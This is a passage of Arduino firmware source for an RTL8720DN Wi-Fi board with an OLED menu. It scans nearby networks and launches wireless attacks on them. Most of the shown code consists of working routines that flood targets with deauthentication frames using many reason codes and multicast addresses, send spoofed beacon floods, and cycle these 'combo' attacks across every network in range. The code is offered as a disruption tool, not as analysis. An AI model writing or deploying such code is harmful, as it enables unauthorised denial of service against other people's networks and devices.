// Wifi
#include "wifi_conf.h"
#include "wifi_cust_tx.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"

// Misc
#undef max
#undef min
#include <SPI.h>
#define SPI_MODE0 0x00

// Define min and max functions to fix errors
template<typename T>
T min(T a, T b) { return (a < b) ? a : b; }

template<typename T>
T max(T a, T b) { return (a > b) ? a : b; }
#include "vector"
#include "map"
#include "debug.h"
#include <Wire.h>

// Display
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

// Pins
#define BTN_DOWN PA27
#define BTN_UP PA12
#define BTN_OK PA13

// VARIABLES
typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];

  short rssi;
  uint channel;
} WiFiScanResult;

// Credentials for you Wifi network
char *ssid = "Kupalka";
char *pass = "password";

int current_channel = 1;
std::vector<WiFiScanResult> scan_results;
WiFiServer server(80);
bool deauth_running = false;
uint8_t deauth_bssid[6];
uint8_t becaon_bssid[6];
uint16_t deauth_reason;
String SelectedSSID;
String SSIDCh;

int attackstate = 0;
int menustate = 0;
bool menuscroll = true;
bool okstate = true;
int scrollindex = 0;
int perdeauth = 3; // Attack intensity control (1-10)
int autoScanInterval = 60; // Auto rescan networks every 60 seconds
unsigned long lastAutoScan = 0;
unsigned long attackStartTime = 0;
unsigned long totalPacketsSent = 0;
int signalBoostMode = 0; // 0=normal, 1=boosted (higher packet rate)
bool advancedMode = false; // Toggle for advanced UI features

// timing variables
unsigned long lastDownTime = 0;
unsigned long lastUpTime = 0;
unsigned long lastOkTime = 0;
const unsigned long DEBOUNCE_DELAY = 150;

// IMAGES
static const unsigned char PROGMEM image_wifi_not_connected__copy__bits[] = { 0x21, 0xf0, 0x00, 0x16, 0x0c, 0x00, 0x08, 0x03, 0x00, 0x25, 0xf0, 0x80, 0x42, 0x0c, 0x40, 0x89, 0x02, 0x20, 0x10, 0xa1, 0x00, 0x23, 0x58, 0x80, 0x04, 0x24, 0x00, 0x08, 0x52, 0x00, 0x01, 0xa8, 0x00, 0x02, 0x04, 0x00, 0x00, 0x42, 0x00, 0x00, 0xa1, 0x00, 0x00, 0x40, 0x80, 0x00, 0x00, 0x00 };
static const unsigned char PROGMEM image_off_text_bits[] = { 0x67, 0x70, 0x94, 0x40, 0x96, 0x60, 0x94, 0x40, 0x64, 0x40 };
static const unsigned char PROGMEM image_network_not_connected_bits[] = { 0x82, 0x0e, 0x44, 0x0a, 0x28, 0x0a, 0x10, 0x0a, 0x28, 0xea, 0x44, 0xaa, 0x82, 0xaa, 0x00, 0xaa, 0x0e, 0xaa, 0x0a, 0xaa, 0x0a, 0xaa, 0x0a, 0xaa, 0xea, 0xaa, 0xaa, 0xaa, 0xee, 0xee, 0x00, 0x00 };
static const unsigned char PROGMEM image_cross_contour_bits[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x80, 0x51, 0x40, 0x8a, 0x20, 0x44, 0x40, 0x20, 0x80, 0x11, 0x00, 0x20, 0x80, 0x44, 0x40, 0x8a, 0x20, 0x51, 0x40, 0x20, 0x80, 0x00, 0x00, 0x00, 0x00 };

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}
void selectedmenu(String text) {
  display.setTextColor(SSD1306_BLACK, SSD1306_WHITE);
  display.println(text);
  display.setTextColor(SSD1306_WHITE, SSD1306_BLACK);
}

int scanNetworks() {
  DEBUG_SER_PRINT("Scanning WiFi Networks (8s)...");
  scan_results.clear();

  // Try up to 3 times to ensure a successful scan
  int retry_count = 0;
  int max_retries = 3;

  while (retry_count < max_retries) {
    if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
      // Set a timeout for scanning - increased for better reliability
      unsigned long startTime = millis();
      while (millis() - startTime < 8000) {
        delay(100); // Small delay to prevent CPU hogging

        // Safety check - if OK button is pressed during scan, cancel it
        if (digitalRead(BTN_OK) == LOW) {
          DEBUG_SER_PRINT(" Cancelled!\n");
          return 2; // Return code for cancelled
        }

        // If we already have a good number of results, we can finish early
        if (scan_results.size() > 10 && millis() - startTime > 5000) {
          break;
        }
      }

      // Ensure we have at least one result
      if (scan_results.size() == 0) {
        DEBUG_SER_PRINT(" No networks found, retrying...\n");
        retry_count++;
        // Try a different channel for next scan
        wext_set_channel(WLAN0_NAME, (retry_count * 5) % 11 + 1);
        delay(500);
        continue;
      }

      // Sort networks by signal strength for better targeting
      for (size_t i = 0; i < scan_results.size(); i++) {
        for (size_t j = i + 1; j < scan_results.size(); j++) {
          if (scan_results[i].rssi < scan_results[j].rssi) {
            // Swap networks
            WiFiScanResult temp = scan_results[i];
            scan_results[i] = scan_results[j];
            scan_results[j] = temp;
          }
        }
      }

      DEBUG_SER_PRINT(" Done! Found ");
      DEBUG_SER_PRINT(scan_results.size());
      DEBUG_SER_PRINT(" networks\n");
      return 0;
    } else {
      DEBUG_SER_PRINT(" Failed attempt ");
      DEBUG_SER_PRINT(retry_count + 1);
      DEBUG_SER_PRINT("/");
      DEBUG_SER_PRINT(max_retries);
      DEBUG_SER_PRINT("\n");
      retry_count++;
      // Reset WiFi adapter if needed
      if (retry_count == max_retries - 1) {
        // Last attempt - try resetting the WiFi
        WiFi.disconnect();
        delay(500);
        WiFi.apbegin(ssid, pass, (char *)String(current_channel).c_str());
        delay(1000);
      }
    }
  }

  DEBUG_SER_PRINT(" All scan attempts failed!\n");
  return 1;
}


// Global flag to control attack operations
volatile bool stopAttackRequested = false;

void requestStopAttack() {
  stopAttackRequested = true;
}

void clearStopRequest() {
  stopAttackRequested = false;
}

// Function to check if MAC address matches our AP
bool isOurAP(uint8_t* mac) {
  // Get MAC address of our WiFi AP
  char our_mac_char[6];
  uint8_t our_mac[6];
  wifi_get_mac_address(our_mac_char);

  // Copy char* to uint8_t* for proper comparison
  for (int i = 0; i < 6; i++) {
    our_mac[i] = (uint8_t)our_mac_char[i];
  }

  // Compare MAC addresses
  for (int i = 0; i < 6; i++) {
    if (mac[i] != our_mac[i]) {
      return false;
    }
  }
  return true;
}

// Function to detect network security type (open, WEP, WPA, etc.)
int getNetworkSecurityType(size_t networkIndex) {
  if (networkIndex >= scan_results.size()) return -1; // Invalid index

  // For RTL8720DN, we don't have direct access to security type from scan
  // We'll use a heuristic approach based on patterns in SSID and common networks

  String ssid = scan_results[networkIndex].ssid;

  // Common patterns for open networks
  if (ssid.indexOf("Guest") != -1 || 
      ssid.indexOf("Public") != -1 || 
      ssid.indexOf("Free") != -1 ||
      ssid.indexOf("Airport") != -1 ||
      ssid.indexOf("WiFi") != -1 ||
      ssid.indexOf("Hotspot") != -1) {
    return 0; // Likely an open network
  }

  // Check for common secure networks
  if (ssid.indexOf("5G") != -1 || 
      ssid.indexOf("Home") != -1 || 
      ssid.indexOf("Private") != -1) {
    return 1; // Likely WPA/WPA2
  }

  // Default to unknown/mixed security
  return 2;
}

void Single() {
  clearStopRequest(); // Clear any previous stop requests
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(5, 10);
  display.println("Single Attack");
  display.setCursor(0, 0);
  display.print("Press UP+OK to STOP");
  display.display();

  unsigned long lastUpdateTime = 0;
  int attackCount = 0;
  unsigned long startTime = millis();

  // Enhanced attack parameters
  uint16_t reasonCodes[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10}; // More reason codes

  // Additional client MACs to target for broader attack
  uint8_t clientMacs[][6] = {
    {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, // Broadcast
    {0x01, 0x00, 0x5E, 0x00, 0x00, 0x00}, // IPv4 Multicast
    {0x33, 0x33, 0x00, 0x00, 0x00, 0x00}, // IPv6 Multicast
    {0x01, 0x80, 0xC2, 0x00, 0x00, 0x00}, // Bridge Multicast
    {0x00, 0x00, 0x00, 0x00, 0x00, 0x00}  // Null address (special case)
  };

  // Determine network security type
  int securityType = getNetworkSecurityType(scrollindex);
  bool isOpenNetwork = (securityType == 0);

  // Attack parameters that vary based on security type
  int attackIntensity = isOpenNetwork ? perdeauth + 2 : perdeauth; // Increase intensity for open networks
  int attackDelay = isOpenNetwork ? 100 : 300; // Faster attack for open networks

  while (!stopAttackRequested) {
    // Set target and channel
    memcpy(deauth_bssid, scan_results[scrollindex].bssid, 6);

    // Check if target is our own AP - skip if it is
    if (isOurAP(deauth_bssid)) {
      display.clearDisplay();
      display.setTextColor(SSD1306_WHITE);
      display.setTextSize(1);
      display.setCursor(5, 20);
      display.println("Cannot attack own AP!");
      display.setCursor(5, 35);
      display.println("Select different target");
      display.display();
      delay(2000);
      requestStopAttack();
      break;
    }

    wext_set_channel(WLAN0_NAME, scan_results[scrollindex].channel);

    // Check for exit button
    if (digitalRead(BTN_OK) == LOW) {
      delay(100);
      requestStopAttack();
      break;
    }

    // Different attack strategy based on network type
    if (isOpenNetwork) {
      // For open networks, we need a more aggressive approach

      // 1. First, send deauth frames with multiple reason codes
      for (size_t r = 0; r < sizeof(reasonCodes)/sizeof(reasonCodes[0]); r++) {
        // Target broadcast MAC
        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", reasonCodes[r]);
        attackCount++;

        // Also target specific client patterns
        if (r % 2 == 0) { // Alternate to save packets
          for (size_t m = 0; m < sizeof(clientMacs)/sizeof(clientMacs[0]); m++) {
            wifi_tx_deauth_frame(deauth_bssid, (void *)clientMacs[m], reasonCodes[r]);
            attackCount++;
          }
        }
      }

      // 2. Send beacon frames to cause confusion
      for (int i = 0; i < attackIntensity; i++) {
        const char *ssid_cstr = scan_results[scrollindex].ssid.c_str();
        wifi_tx_beacon_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", ssid_cstr);
        attackCount++;
      }

      // 3. Send specially crafted frames for open networks
      for (size_t m = 0; m < sizeof(clientMacs)/sizeof(clientMacs[0]); m++) {
        // Class 3 frames from non-associated stations
        wifi_tx_deauth_frame(deauth_bssid, (void *)clientMacs[m], 7);
        attackCount++;

        // Invalid authentication frames
        wifi_tx_deauth_frame(deauth_bssid, (void *)clientMacs[m], 2);
        attackCount++;

        // Disassociation due to inactivity
        wifi_tx_deauth_frame(deauth_bssid, (void *)clientMacs[m], 4);
        attackCount++;
      }
    } else {
      // Regular attack for secure networks - still enhanced
      for (int i = 0; i < attackIntensity; i++) {
        for (size_t r = 0; r < sizeof(reasonCodes)/sizeof(reasonCodes[0]); r += 3) {
          // Broadcast deauth
          wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", reasonCodes[r]);
          attackCount++;

          // Target specific client patterns periodically
          if (i % 3 == 0) {
            for (size_t m = 0; m < 2; m++) { // Limited subset to conserve packets
              wifi_tx_deauth_frame(deauth_bssid, (void *)clientMacs[m], reasonCodes[r]);
              attackCount++;
            }
          }
        }
      }
    }

    // Add small delay based on network type
    delayMicroseconds(attackDelay);

    // Update display periodically
    unsigned long currentTime = millis();
    if (currentTime - lastUpdateTime > 500) {
      display.clearDisplay();
      display.setTextColor(SSD1306_WHITE);
      display.setTextSize(1);

      // Title with frame
      drawStatusBar("SINGLE ATTACK");
      drawFrame();

      // Display target information
      display.setCursor(5, 15);
      display.print("Target: ");
      if (scan_results[scrollindex].ssid.length() > 10) {
        display.println(scan_results[scrollindex].ssid.substring(0, 8) + "..");
      } else {
        display.println(scan_results[scrollindex].ssid);
      }

      // Display network info with security type
      display.setCursor(5, 25);
      display.print("CH: ");
      display.print(scan_results[scrollindex].channel);
      display.print(" | ");
      display.print(isOpenNetwork ? "OPEN" : "SECURE");

      // Display packets sent
      display.setCursor(5, 35);
      display.print("Packets: ");
      display.println(attackCount);

      // Show time running
      display.setCursor(5, 45);
      display.print("Time: ");
      display.print((currentTime - startTime) / 1000);
      display.println("s");

      // Draw intensity progress bar
      drawProgressBar(5, 55, 118, 8, (attackIntensity * 100) / 10);

      display.display();
      lastUpdateTime = currentTime;
    }
  }
}
void All() {
  clearStopRequest(); // Clear any previous stop requests
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(5, 15);
  display.println("Attacking All Networks");
  display.setCursor(0, 0);
  display.print("Press UP+OK to STOP");
  display.display();

  // Sort networks by signal strength first
  std::vector<size_t> sorted_indices;
  for (size_t i = 0; i < scan_results.size(); i++) {
    sorted_indices.push_back(i);
  }

  // Sort networks by signal strength (RSSI) - higher values first
  for (size_t i = 0; i < sorted_indices.size(); i++) {
    for (size_t j = i + 1; j < sorted_indices.size(); j++) {
      if (scan_results[sorted_indices[i]].rssi < scan_results[sorted_indices[j]].rssi) {
        // Swap indices
        size_t temp = sorted_indices[i];
        sorted_indices[i] = sorted_indices[j];
        sorted_indices[j] = temp;
      }
    }
  }

  // Define common client MAC addresses to target - expanded for better coverage
  uint8_t common_macs[][6] = {
    {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, // Broadcast
    {0x01, 0x00, 0x5E, 0x00, 0x00, 0x01}, // Multicast
    {0x01, 0x00, 0x0C, 0x00, 0x00, 0x00}, // Cisco multicast
    {0x33, 0x33, 0x00, 0x00, 0x00, 0x01}, // IPv6 multicast
    {0x01, 0x80, 0xC2, 0x00, 0x00, 0x00}, // Bridge multicast
    {0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, // Null address
    {0x01, 0x00, 0x0C, 0xCC, 0xCC, 0xCC}, // CDP/VTP/UDLD
    {0x01, 0x00, 0x0C, 0xCD, 0xCD, 0xCD}  // PVST+
  };

  // Enhanced deauth reason codes that are more effective
  uint16_t reason_codes[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};

  unsigned long startTime = millis();
  unsigned long lastUpdateTime = 0;
  int networkIndex = 0;
  int attackCount = 0;
  int openNetworkCount = 0;

  while (!stopAttackRequested) {
    unsigned long currentTime = millis();

    // Check for exit condition
    if (digitalRead(BTN_OK) == LOW) {
      delay(100);
      requestStopAttack();
      break;
    }

    // Get the network to attack in this iteration (rotating through sorted networks)
    size_t idx = sorted_indices[networkIndex];
    networkIndex = (networkIndex + 1) % sorted_indices.size();

    // Copy target network BSSID and set channel
    memcpy(deauth_bssid, scan_results[idx].bssid, 6);
    wext_set_channel(WLAN0_NAME, scan_results[idx].channel);

    // Skip our own AP
    if (isOurAP(deauth_bssid)) {
      continue;
    }

    // Determine network security type
    int securityType = getNetworkSecurityType(idx);
    bool isOpenNetwork = (securityType == 0);

    // Update display periodically (every 500ms)
    if (currentTime - lastUpdateTime > 500) {
      display.clearDisplay();
      display.setTextColor(SSD1306_WHITE);
      display.setTextSize(1);
      display.setCursor(5, 10);
      display.println("Attacking All Networks");

      // Show attack stats
      display.setCursor(5, 25);
      display.print("Target: ");
      if (scan_results[idx].ssid.length() > 10) {
        display.println(scan_results[idx].ssid.substring(0, 8) + "..");
      } else {
        display.println(scan_results[idx].ssid);
      }

      display.setCursor(5, 35);
      display.print("Ch: ");
      display.print(scan_results[idx].channel);
      display.print(" | Pkts: ");
      display.println(attackCount);

      // Show open network indicator if applicable
      if (isOpenNetwork) {
        display.setCursor(75, 35);
        display.print("OPEN");
      }

      // Show time running
      display.setCursor(5, 45);
      display.print("Time: ");
      display.print((currentTime - startTime) / 1000);
      display.println("s");

      // Draw progress bar for intensity
      drawProgressBar(5, 55, 118, 8, (perdeauth * 100) / 10); // Scale to max 10

      display.display();
      lastUpdateTime = currentTime;
    }

    // Special attack strategy for open networks
    if (isOpenNetwork) {
      openNetworkCount++;

      // For open networks, use a multi-pronged approach:

      // 1. Send deauths with all reason codes to broadcast
      for (size_t r = 0; r < sizeof(reason_codes)/sizeof(reason_codes[0]); r++) {
        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", reason_codes[r]);
        attackCount++;
      }

      // 2. Send directed deauths to various client targets
      for (size_t m = 0; m < sizeof(common_macs)/sizeof(common_macs[0]); m++) {
        wifi_tx_deauth_frame(deauth_bssid, (void *)common_macs[m], 7); // Reason 7: Class 3 frame received from nonassociated station
        attackCount++;
      }

      // 3. Send authentication frames with invalid sequence numbers
      for (size_t s = 0; s < 4; s++) {
        // Auth frame structure is handled internally by wifi_tx_auth_frame
        // We just supply BSSID, destination MAC, and sequence number
        for (size_t m = 0; m < sizeof(common_macs)/sizeof(common_macs[0]); m++) {
          wifi_tx_deauth_frame(deauth_bssid, (void *)common_macs[m], 2); // Class 2 frame received from nonassociated station
          attackCount++;

          // Extra disassociation frames for persistent disruption
          wifi_tx_deauth_frame(deauth_bssid, (void *)common_macs[m], 4); // Disassociated due to inactivity
          attackCount++;
        }
      }

      // 4. Flood with beacon frames to cause confusion
      for (int b = 0; b < perdeauth; b++) {
        const char *ssid_cstr = scan_results[idx].ssid.c_str();
        wifi_tx_beacon_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", ssid_cstr);
        attackCount++;
      }
    } 
    // Regular attack for secure networks
    else {
      // Send deauth packets to various targets with different reason codes
      for (size_t m = 0; m < sizeof(common_macs)/sizeof(common_macs[0]); m++) {
        for (size_t r = 0; r < sizeof(reason_codes)/sizeof(reason_codes[0]); r += 3) { // Increased rate for better coverage
          for (int x = 0; x < perdeauth; x++) {
            // Target specific clients with this network
            wifi_tx_deauth_frame(deauth_bssid, (void *)common_macs[m], reason_codes[r]);
            attackCount++;

            // Small delay to prevent flooding too quickly
            if (r % 3 == 0) delayMicroseconds(300);
          }
        }
      }
    }

    // Small delay between networks to give the device time to switch channels
    delay(5);
  }
}
void BecaonDeauth() {
  clearStopRequest(); // Clear any previous stop requests
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(0, 0);
  display.print("Press UP+OK to STOP");

  // Start with dramatic launch sequence
  for (int i = 3; i > 0; i--) {
    // Check for early exit button
    if (digitalRead(BTN_OK) == LOW) {
      requestStopAttack();
      return;
    }

    display.clearDisplay();
    display.setTextColor(WHITE);

    // Countdown frame
    display.drawRect(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, WHITE);
    display.drawRect(2, 2, SCREEN_WIDTH-4, SCREEN_HEIGHT-4, WHITE);

    // Warning text
    display.setTextSize(1);
    display.setCursor(15, 10);
    display.print("LAUNCHING COMBO ATTACK");

    // Countdown number
    display.setTextSize(3);
    display.setCursor(58, 25);
    display.print(i);

    // Warning text
    display.setTextSize(1);
    display.setCursor(10, 50);
    display.print("MAXIMUM DISRUPTION MODE");

    display.display();
    delay(700);
  }

  // Final "GO" screen
  display.clearDisplay();
  display.fillScreen(WHITE);
  display.setTextColor(BLACK);
  display.setTextSize(3);
  display.setCursor(40, 25);
  display.print("GO!");
  display.display();
  delay(400);

  // Attack variables
  unsigned long startTime = millis();
  unsigned long lastUpdateTime = 0;
  int beaconCount = 0;
  int deauthCount = 0;
  int networkIndex = 0;
  int totalNetworks = scan_results.size();
  bool animState = false;
  unsigned long blinkTimer = 0;

  // Track open network count
  int openNetworkCount = 0;

  // Enhanced reason codes array with more effective options
  uint16_t reasonCodes[] = {1, 2, 4, 5, 7, 8, 9};

  // Enhanced client MACs for better coverage of different client types
  uint8_t clientMacs[][6] = {
    {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, // Broadcast
    {0x01, 0x00, 0x5E, 0x00, 0x00, 0x01}, // IPv4 Multicast
    {0x33, 0x33, 0x00, 0x00, 0x00, 0x01}, // IPv6 Multicast
    {0x01, 0x80, 0xC2, 0x00, 0x00, 0x00}, // Bridge Multicast
    {0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, // Null MAC (special case)
    {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF}  // Fake client MAC
  };

  while (!stopAttackRequested) {
    // Exit condition
    if (digitalRead(BTN_OK) == LOW) {
      delay(100);
      requestStopAttack();
      break;
    }

    // Cycle through networks
    int targetsPerCycle = min(3, totalNetworks);
    for (int i = 0; i < targetsPerCycle; i++) {
      int idx = (networkIndex + i) % totalNetworks;
      String ssid1 = scan_results[idx].ssid;
      const char *ssid1_cstr = ssid1.c_str();

      // Check network security type
      int securityType = getNetworkSecurityType(idx);
      bool isOpenNetwork = (securityType == 0);
      if (isOpenNetwork) openNetworkCount++;

      memcpy(becaon_bssid, scan_results[idx].bssid, 6);
      memcpy(deauth_bssid, scan_results[idx].bssid, 6);
      wext_set_channel(WLAN0_NAME, scan_results[idx].channel);

      // Only attack if it's not our own AP
      if (!isOurAP(deauth_bssid)) {
        // Different attack strategy based on network type
        if (isOpenNetwork) {
          // Enhanced attack for open networks

          // 1. Intensive beacon flooding (causes more disruption to open networks)
          for (int x = 0; x < perdeauth * 2; x++) {
            wifi_tx_beacon_frame(becaon_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", ssid1_cstr);
            beaconCount++;
          }

          // 2. Targeted deauths with all reason codes to maximize effectiveness
          for (size_t r = 0; r < sizeof(reasonCodes)/sizeof(reasonCodes[0]); r++) {
            // First hit the broadcast address
            wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", reasonCodes[r]);
            deauthCount++;

            // Then target all potential client types
            for (size_t m = 0; m < sizeof(clientMacs)/sizeof(clientMacs[0]); m++) {
              wifi_tx_deauth_frame(deauth_bssid, (void *)clientMacs[m], reasonCodes[r]);
              deauthCount++;
            }
          }

          // 3. Special packet sequences for open networks
          for (int x = 0; x < perdeauth; x++) {
            // Auth-deauth sequence with invalid sequence numbers
            for (int seq = 1; seq <= 3; seq += 2) { // Odd sequence numbers are invalid
              for (size_t m = 0; m < sizeof(clientMacs)/sizeof(clientMacs[0]); m += 2) {
                // Advanced deauth tactics for open networks
                wifi_tx_deauth_frame(deauth_bssid, (void *)clientMacs[m], 7); // Class 3 frame received from non-associated STA
                deauthCount++;
              }
            }
          }

        } else {
          // Standard combo attack for secured networks
          for (int x = 0; x < perdeauth; x++) {
            // Send beacon frame
            wifi_tx_beacon_frame(becaon_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", ssid1_cstr);
            beaconCount++;

            // Send multiple deauth frames with different reason codes
            for (size_t r = 0; r < sizeof(reasonCodes)/sizeof(reasonCodes[0]); r++) {
              wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", reasonCodes[r]);
              deauthCount++;
            }
          }
        }
      } else {
        // Skip our own AP but count toward progress
        display.setTextColor(WHITE);
        display.setCursor(5, 15);
        display.print("SKIPPING OWN AP: ");
        if (ssid1.length() > 10) {
          display.println(ssid1.substring(0, 8) + "..");
        } else {
          display.println(ssid1);
        }
        display.display();
        delay(100);
      }
    }

    // Rotate to next network group
    networkIndex = (networkIndex + targetsPerCycle) % totalNetworks;

    // Update display at regular intervals
    if (millis() - lastUpdateTime > 250) {
      display.clearDisplay();

      // Blinking effect for warning indicator
      if (millis() - blinkTimer > 500) {
        animState = !animState;
        blinkTimer = millis();
      }

      // Warning header with animation
      display.fillRect(0, 0, SCREEN_WIDTH, 10, animState ? WHITE : BLACK);
      display.setTextColor(animState ? BLACK : WHITE);
      display.setTextSize(1);
      display.setCursor(8, 1);
      display.print("!! COMBO ATTACK ACTIVE !!");

      // Draw frame
      display.drawRect(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, WHITE);

      // Hazard corners that flash
      if (animState) {
        display.fillTriangle(0, 0, 12, 0, 0, 12, WHITE);
        display.fillTriangle(SCREEN_WIDTH-1, 0, SCREEN_WIDTH-13, 0, SCREEN_WIDTH-1, 12, WHITE);
        display.fillTriangle(0, SCREEN_HEIGHT-1, 12, SCREEN_HEIGHT-1, 0, SCREEN_HEIGHT-13, WHITE);
        display.fillTriangle(SCREEN_WIDTH-1, SCREEN_HEIGHT-1, SCREEN_WIDTH-13, SCREEN_HEIGHT-1, SCREEN_WIDTH-1, SCREEN_HEIGHT-13, WHITE);
      }

      // Current target info
      display.setTextColor(WHITE);
      display.setCursor(5, 15);
      display.print("TARGET: ");
      String currentTarget = scan_results[networkIndex].ssid;
      if (currentTarget.length() > 10) {
        currentTarget = currentTarget.substring(0, 8) + "..";
      }
      display.println(currentTarget);

      // Network type and channel info
      int secType = getNetworkSecurityType(networkIndex);
      display.setCursor(5, 25);
      display.print("CH: ");
      display.print(scan_results[networkIndex].channel);
      display.print(" | ");

      // Show security type
      if (secType == 0) {
        display.print("OPEN");
      } else {
        display.print(scan_results[networkIndex].channel >= 36 ? "5G" : "2.4G");
      }

      // Stats - two bars showing packets sent
      display.setCursor(5, 35);
      display.print("BEACONS: ");
      display.print(beaconCount);
      drawProgressBar(70, 35, 53, 6, min(beaconCount / 50, 100));

      display.setCursor(5, 45);
      display.print("DEAUTHS: ");
      display.print(deauthCount);
      drawProgressBar(70, 45, 53, 6, min(deauthCount / 50, 100));

      // Time and open network info
      display.setCursor(5, 55);
      display.print("TIME: ");
      display.print((millis() - startTime) / 1000);
      display.print("s");

      // Show open network count in bottom right
      display.fillRect(105, 55, 20, 8, WHITE);
      display.setTextColor(BLACK);
      display.setCursor(108, 56);
      display.print("O:");
      display.print(openNetworkCount);

      display.display();
      lastUpdateTime = millis();
    }
  }
}
void Becaon() {
  clearStopRequest(); // Clear any previous stop requests
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(0, 0);
  display.print("Press UP+OK to STOP");

  // Initial animation effect
  for (int i = 0; i < 5; i++) {
    // Check for early exit button
    if (digitalRead(BTN_OK) == LOW) {
      requestStopAttack();
      return;
    }

    display.clearDisplay();
    // Draw warning triangles that pulse
    display.fillTriangle(32, 15+i, 42+i, 32, 22-i, 32, WHITE);
    display.fillTriangle(96, 15+i, 106+i, 32, 86-i, 32, WHITE);

    // Animated title
    display.fillRect(0, 0, SCREEN_WIDTH, 12, i % 2 == 0 ? WHITE : BLACK);
    display.setTextColor(i % 2 == 0 ? BLACK : WHITE);
    display.setTextSize(1);
    display.setCursor(20, 2);
    display.print("BEACON FLOOD ATTACK");

    display.setTextColor(WHITE);
    display.setCursor(10, 38);
    display.print("INITIALIZING");
    for (int j = 0; j < i; j++) display.print(".");

    display.display();
    delay(200);
  }

  // Attack variables
  unsigned long startTime = millis();
  unsigned long lastUpdateTime = 0;
  unsigned long beaconCount = 0;
  int currentNetIndex = 0;

  while (!stopAttackRequested) {
    // Exit condition
    if (digitalRead(BTN_OK) == LOW) {
      delay(100);
      requestStopAttack();
      break;
    }

    // Cycle through all networks and flood with beacons
    for (size_t i = 0; i < min((size_t)5, scan_results.size()); i++) {
      int idx = (currentNetIndex + i) % scan_results.size();
      String ssid1 = scan_results[idx].ssid;
      const char *ssid1_cstr = ssid1.c_str();

      memcpy(becaon_bssid, scan_results[idx].bssid, 6);
      wext_set_channel(WLAN0_NAME, scan_results[idx].channel);

      // Send beacon frames
      for (int x = 0; x < perdeauth * 2; x++) {
        wifi_tx_beacon_frame(becaon_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", ssid1_cstr);
        beaconCount++;
      }
    }

    // Update display every 300ms
    if (millis() - lastUpdateTime > 300) {
      display.clearDisplay();

      // Draw title bar with hazard stripes
      display.fillRect(0, 0, SCREEN_WIDTH, 12, WHITE);
      for (int s = 0; s < SCREEN_WIDTH; s+= 10) {
        display.fillRect(s, 0, 5, 12, BLACK);
      }
      display.setTextColor(WHITE);
      display.setCursor(15, 2);
      display.print("BEACON FLOOD ACTIVE");

      // Draw attack frame
      display.drawRect(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, WHITE);
      display.drawRect(2, 14, SCREEN_WIDTH-4, SCREEN_HEIGHT-16, WHITE);

      // Current network being attacked
      currentNetIndex = (currentNetIndex + 1) % scan_results.size();
      display.setTextColor(WHITE);

      // Show current network
      display.setCursor(5, 17);
      display.print("FLOODING ");
      display.print(scan_results.size());
      display.print(" NETWORKS");

      // Current target
      display.setCursor(5, 27);
      String currTarget = scan_results[currentNetIndex].ssid;
      if (currTarget.length() > 14) {
        currTarget = currTarget.substring(0, 12) + "..";
      }
      display.print("NOW: ");
      display.print(currTarget);

      // Stats display
      display.setCursor(5, 37);
      display.print("SENT: ");
      display.print(beaconCount);
      display.print(" BEACONS");

      // Time running
      display.setCursor(5, 47);
      unsigned long runTime = (millis() - startTime) / 1000;
      display.print("TIME: ");
      display.print(runTime);
      display.print("s");

      // Draw intensity bar
      drawProgressBar(5, 55, 118, 8, (perdeauth * 100) / 10);

      display.display();
      lastUpdateTime = millis();
    }
  }
}
// Custom UI elements
void drawFrame() {
  display.drawRect(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, WHITE);
  display.drawRect(2, 2, SCREEN_WIDTH - 4, SCREEN_HEIGHT - 4, WHITE);
}

void drawProgressBar(int x, int y, int width, int height, int progress) {
